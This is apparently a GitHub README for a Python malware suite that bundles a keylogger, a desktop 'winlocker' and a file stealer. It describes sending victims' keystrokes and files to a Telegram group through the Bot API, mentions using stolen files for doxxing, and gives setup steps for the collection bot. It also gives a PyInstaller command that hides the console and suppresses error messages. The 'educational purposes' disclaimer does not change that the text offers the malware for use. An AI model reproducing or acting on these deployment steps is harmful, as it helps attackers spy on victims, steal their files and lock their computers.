# T.V.M.A.N. - Telegram Viral Malware Application Network

Disclaimer: I hearby do not encourage user to use this program with ill or malicious intent.
I will not be held responsible for any damage caused by careless usage or just for laughs. USE IT
AS YOUR OWN RISK. Strictly for educational purposes only.

## What it is...

T.V.M.A.N. is an <span style='font-style: italic;'>"incomplete" </span> 
suite of malwares i tried to remake from other repositories found here in Github and as well as other websites. As of now, there are currently:
1. keylogger
2. Winlocker
3. file stealer

...Almost finished.

run `python -m pip install -r requirements.txt` to download and install the modules needed.

### Keylogger

A keylogger is a spyware designed to record and send your keyboard inputs.

### Winlocker (Chebeslock)

A winlocker completely locks your desktop and ask you something to 'unlock' it. the question is completely arbitary. Works best with Ransomwares. By far the simplest one in the group.

### T.V.M.A.N. File Stealer

This one is not finished yet. it's designed to search for files and send them to a Telegram Group using the Telegram Bot API. unfortunately, the API states that the maximum file upload limit is 20MB. so it's not recommneded for large files, but for doxxing, it's more than enough.


##
Now the malware uses the Telegram Bot API for data collecion from the spywares and malwares. The easiest way to create a bot is to use Botfather. A quick google search will give yiu hundreds of tutorials on how to do that. Then, get the bot token, and create a public group and add the bot you created as an admin. then run this on your Web browser:

`https://api.telegram.org/bot[token]/getUpdates`
where [token] is the token you got from botfather (without the brackets.)
...

## Payload and Compilation

As for all other Python Scripts, you're going to use Pyinstaller to convert the script to an excecutable. Assuming you have Pyintaller downloaded, Open a terminal and run:

`pyinstaller -F -w --disable-windowed-traceback --hide-console hide-late klogger.py` (for Klogger. change the script's name for other malwares.)

What it does is Pyinstaller will compile it in to one file, hides the console, and disables error messages.

Since it's currently in development, i'm planning for aa setup compiler that will do the compilation.



